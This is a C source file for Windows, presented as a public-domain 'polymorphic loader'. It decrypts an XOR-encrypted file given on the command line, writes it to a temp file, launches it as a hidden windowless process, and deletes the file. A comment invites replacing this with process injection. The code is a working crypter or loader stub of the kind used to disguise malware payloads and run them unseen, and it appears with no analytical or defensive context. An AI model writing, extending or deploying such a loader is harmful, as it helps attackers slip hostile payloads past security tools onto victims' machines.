/*
 * loader.c - Public Domain Polymorphic Loader
 * 
 * This is free and unencumbered software released into the public domain.
 * 
 * Anyone is free to copy, modify, publish, use, compile, sell, or
 * distribute this software, either in source code form or as a compiled
 * binary, for any purpose, commercial or non-commercial, and by any
 * means.
 * 
 * In jurisdictions that recognize copyright laws, the author or authors
 * of this software dedicate any and all copyright interest in the
 * software to the public domain. We make this dedication for the benefit
 * of the public at large and to the detriment of our heirs and
 * successors. We intend this dedication to be an overt act of
 * relinquishment in perpetuity of all present and future rights to this
 * software under copyright law.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
 * OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
 * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 * 
 * For more information, please refer to <http://unlicense.org/>
 * 
 * Compile: cl /W4 /O2 loader.c /link /SUBSYSTEM:WINDOWS /ENTRY:wmainCRTStartup
 */
#include <windows.h>
#include <stdio.h>
#include "poly_key.h"

static inline void
crypt_bytes(BYTE *buf, SIZE_T len, DWORD key)
{
    for (SIZE_T i = 0; i < len; ++i) {
        buf[i] ^= (BYTE)(key >> (8 * (i & 3)));
        key = _rotl(key, 1);
    }
}

static BOOL
run_from_mem(LPCWSTR path)
{
    HANDLE hFile = CreateFileW(path, GENERIC_READ,
                               FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD sz = GetFileSize(hFile, NULL);
    BYTE *raw = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz);
    DWORD read;
    ReadFile(hFile, raw, sz, &read, NULL);
    CloseHandle(hFile);

    /* in-place decrypt */
    crypt_bytes(raw, sz, RANDOM_KEY);

    /* execute as a new process (replace with injection if you like) */
    WCHAR tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"pl", 0, tmpPath);

    HANDLE hOut = CreateFileW(tmpPath, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hOut, raw, sz, &written, NULL);
    CloseHandle(hOut);
    HeapFree(GetProcessHeap(), 0, raw);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(tmpPath, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileW(tmpPath);
    return TRUE;
}

int WINAPI
wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmd, int nShow)
{
    if (__argc < 2) return 0;
    run_from_mem(__wargv[1]);
    return 0;
}
